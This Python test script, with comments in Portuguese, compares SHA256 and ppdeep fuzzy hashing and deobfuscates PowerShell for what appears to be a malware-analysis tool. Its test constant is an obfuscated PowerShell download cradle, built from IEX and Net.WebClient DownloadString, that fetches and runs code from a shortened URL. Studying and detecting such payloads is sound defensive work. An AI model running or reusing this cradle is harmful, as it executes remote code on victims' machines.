"""
Script para comparar métodos de hashing (ppdeep vs hashlib) e deobfuscação
"""
import sys
import time
import os

# Adicionar o diretório api ao path para importações corretas
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'api'))

# Payload obfuscado para teste
OBFUSCATED_PAYLOAD = """("{1}{0}" -f 'x','IE') (&("{3}{2}{1}{0}"-f'ct','-Obje','w','Ne') ("{0}{2}{1}"-f 'N','nt','et.WebClie')).("{2}{0}{1}{3}"-f'dSt','rin','Downloa','g').Invoke(('''tp://','9','','git','.ly/','ht'))"""


def test_hashlib_method():
    """Testa o método original com hashlib SHA256"""
    print("\n" + "="*70)
    print("📊 MÉTODO 1: hashlib SHA256 (Hash Exato)")
    print("="*70)
    
    try:
        import hashlib
        
        original_hash = hashlib.sha256(OBFUSCATED_PAYLOAD.encode()).hexdigest()
        print(f"✅ hashlib importado com sucesso")
        print(f"\n📝 Payload original:")
        print(f"   {OBFUSCATED_PAYLOAD[:80]}...")
        print(f"\n🔐 SHA256 Hash:")
        print(f"   {original_hash}")
        print(f"\n📊 Características:")
        print(f"   - Tipo: Hash Criptográfico Exato")
        print(f"   - Tamanho: 64 caracteres (256 bits)")
        print(f"   - Sensibilidade: ALTA (qualquer mudança = hash diferente)")
        print(f"   - Velocidade: Muito rápido")
        
        return original_hash
    except Exception as e:
        print(f"❌ Erro: {e}")
        return None


def test_ppdeep_method():
    """Testa o método novo com ppdeep fuzzy hashing"""
    print("\n" + "="*70)
    print("📊 MÉTODO 2: ppdeep Fuzzy Hashing")
    print("="*70)
    
    try:
        import ppdeep
        
        fuzzy_hash = ppdeep.hash(OBFUSCATED_PAYLOAD)
        print(f"✅ ppdeep importado com sucesso")
        print(f"\n📝 Payload original:")
        print(f"   {OBFUSCATED_PAYLOAD[:80]}...")
        print(f"\n🔐 Fuzzy Hash (ppdeep):")
        print(f"   {fuzzy_hash}")
        print(f"\n📊 Características:")
        print(f"   - Tipo: Fuzzy Hash")
        print(f"   - Tamanho: Variável (geralmente 31+ caracteres)")
        print(f"   - Sensibilidade: BAIXA (detecta similaridade)")
        print(f"   - Velocidade: Rápido")
        print(f"   - Vantagem: Detecta variações/obfuscações do mesmo comando")
        
        return fuzzy_hash
    except ImportError:
        print(f"⚠️  ppdeep não está instalado")
        print(f"   Instale com: pip install pydeep")
        return None
    except Exception as e:
        print(f"❌ Erro: {e}")
        return None


def test_deobfuscation():
    """Testa a deobfuscação do payload"""
    print("\n" + "="*70)
    print("🔍 DEOBFUSCAÇÃO: PowerShell")
    print("="*70)
    
    try:
        # Importar o módulo de análise com path corrigido
        from services.powershell_analyzer import (
            deobfuscate_powershell,
            normalize_powershell_command
        )
        
        print(f"✅ Módulo de análise importado com sucesso")
        
        # Normalizar
        print(f"\n📝 Passo 1: Normalizar comando")
        normalized = normalize_powershell_command(OBFUSCATED_PAYLOAD)
        print(f"   ✓ Normalizado (caracteres especiais removidos)")
        
        # Deobfuscar
        print(f"\n📝 Passo 2: Deobfuscar comando")
        start_time = time.time()
        deobfuscated = deobfuscate_powershell(OBFUSCATED_PAYLOAD)
        elapsed = time.time() - start_time
        
        print(f"   ✓ Tempo: {elapsed:.3f}s")
        print(f"\n🔓 Comando Deobfuscado:")
        print(f"   {deobfuscated}")
        
        print(f"\n📊 Análise de Deobfuscação:")
        print(f"   - Payload original: {len(OBFUSCATED_PAYLOAD)} caracteres")
        print(f"   - Payload deobfuscado: {len(deobfuscated)} caracteres")
        print(f"   - Redução: {len(OBFUSCATED_PAYLOAD) - len(deobfuscated)} chars")
        print(f"   - Foi modificado: {deobfuscated != OBFUSCATED_PAYLOAD}")
        
        return deobfuscated
    except ImportError as ie:
        print(f"⚠️  Erro de importação: {ie}")
        print(f"   Verifique se pyminusone está instalado: pip install pyminusone")
        return None
    except Exception as e:
        print(f"❌ Erro na deobfuscação: {e}")
        import traceback
        traceback.print_exc()
        return None


def compare_hashes(sha256_hash, ppdeep_hash, original_payload, deobfuscated_payload):
    """Compara os dois métodos de hashing"""
    print("\n" + "="*70)
    print("⚖️  COMPARAÇÃO DE MÉTODOS")
    print("="*70)
    
    if sha256_hash and ppdeep_hash:
        print(f"\n✅ Ambos os métodos funcionaram")
        print(f"\n📊 SHA256 (Método Original):")
        print(f"   Hash: {sha256_hash[:40]}...")
        print(f"   Mudou entre original/deobfuscado: SIM (sempre diferente)")
        
        print(f"\n📊 ppdeep Fuzzy (Método Novo):")
        print(f"   Hash: {ppdeep_hash[:40]}...")
        
        if original_payload and deobfuscated_payload and original_payload != deobfuscated_payload:
            try:
                import ppdeep
                deobf_hash = ppdeep.hash(deobfuscated_payload)
                similarity = ppdeep.compare(ppdeep_hash, deobf_hash)
                print(f"   Hash deobfuscado: {deobf_hash[:40]}...")
                print(f"   Similaridade: {similarity}%")
                print(f"   Detectou obfuscação: {similarity < 100}")
            except Exception as e:
                print(f"   ⚠️  Erro ao comparar: {e}")
        
        print(f"\n🎯 Conclusão:")
        print(f"   • SHA256: Melhor para fingerprinting exato")
        print(f"   • ppdeep: Melhor para detectar obfuscação/variações")
        print(f"   • Recomendação: Usar ppdeep para análise de PowerShell obfuscado")


def main():
    """Função principal"""
    print("\n" + "█"*70)
    print("█" + " "*68 + "█")
    print("█" + "  ANÁLISE COMPARATIVA: Hashing e Deobfuscação PowerShell".center(68) + "█")
    print("█" + " "*68 + "█")
    print("█"*70)
    
    # Teste 1: SHA256
    sha256_hash = test_hashlib_method()
    
    # Teste 2: ppdeep
    ppdeep_hash = test_ppdeep_method()
    
    # Teste 3: Deobfuscação
    deobfuscated = test_deobfuscation()
    
    # Comparação
    compare_hashes(sha256_hash, ppdeep_hash, OBFUSCATED_PAYLOAD, deobfuscated)
    
    print("\n" + "█"*70)
    print("✅ Análise concluída!")
    print("█"*70 + "\n")


if __name__ == "__main__":
    main()
